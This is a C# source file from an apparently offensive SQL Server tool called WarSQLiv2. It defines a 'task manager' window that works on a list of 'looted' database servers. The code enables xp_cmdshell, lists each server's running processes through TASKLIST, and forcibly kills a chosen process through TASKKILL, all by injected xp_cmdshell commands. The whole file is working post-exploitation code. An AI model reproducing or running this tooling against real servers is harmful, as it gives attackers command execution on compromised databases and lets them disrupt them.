using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmTaskManager.xaml
    /// </summary>
    public partial class FrmTaskManager : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmTaskManager()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    btnGet.Content = _languageControl.SelectedLanguage.GetString("ButtonShow");
                    Title = _languageControl.SelectedLanguage.GetString("TitleAllPrograms");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void btnGet_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                try
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        lstTaskList.Items.Clear();
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.ExploitCode = "EXEC xp_cmdshell '\"TASKLIST /V /FO CSV\"'";
                        _postExploitation.ShowProgramList();                        
                        for (var i = 0; i < _postExploitation._programList.Count; i++)
                        {
                            lstTaskList.Items.Add(_postExploitation._programList[i].Replace("\"", "").Replace("\r","").Replace("\n",""));
                        }
                        txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageExploitTask2"));
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }
            }
        }
        private void lstTaskList_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (lstTaskList.SelectedIndex > -1)
            {
                MessageBoxResult result = MessageBox.Show(_languageControl.SelectedLanguage.GetString("MessageExploitTask3"), @"WarSQLiv2", MessageBoxButton.YesNo);
                if (result == MessageBoxResult.Yes)
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitTask5")}");
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        var killTask = lstTaskList.SelectedItem.ToString().Trim().Split(',');
                        var taskCommand = "USE [master]\r\n";
                        taskCommand += "EXEC xp_cmdshell '\"TASKKILL /PID " + killTask[1].Trim().Replace("\"", "") + " /T /F\"';\r\n";
                        _postExploitation.ExploitCode = taskCommand;
                        _postExploitation.ShowProgramList();
                        var errorx = _postExploitation._programList.Count;
                        if(errorx == 3)
                        {
                            for (var i = 0; i < _postExploitation._programList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation._programList[i].Replace("\"", ""));
                            }
                        }
                        else if (errorx == 2)
                        {
                            for (var i = 0; i < _postExploitation._programList.Count; i++)
                            {
                                txtStatus.AppendText(_postExploitation._programList[i].Replace("\"", ""));
                            }
                        }            
                        
                    });
                }
            }
        }
    }
}
